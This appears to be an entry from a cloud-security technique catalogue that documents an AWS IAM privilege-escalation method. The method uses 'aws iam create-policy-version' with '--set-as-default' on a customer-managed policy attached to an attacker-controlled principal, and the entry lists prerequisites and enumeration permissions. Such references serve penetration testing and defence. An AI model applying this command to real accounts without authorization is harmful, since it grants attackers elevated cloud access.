---
description: |
    This command should be executed against a customer managed policy that is already attached or can be attached to a user or role you control, or a group you are a member of.

    The command creates a new version of the customer managed policy with increased permissions compared to the original. The inclusion of the **--set-as-default** flag causes the new policy to be automatically applied.
details:
    AWS-CLI-command:
        - code: |
            aws iam create-policy-version --policy-arn {policy arn} --policy-document file://{path to policy json} --set-as-default
    required-privileges:
        - code: |
            None
    required-configurations:
        - code: |
            A customer managed policy attached to a user or role you control, or a group you are a member of.
    useful-privileges:
        - code: |
            iam:ListAttachedUserPolicies
            iam:ListAttachedRolePolicies
            iam:ListAttachedGroupPolicies
            iam:ListGroups
            iam:GetGroup
    sources:
        - code: |
            https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
    submitted-by:
        - code: |
            Lucas Fedyniak-Hopes
---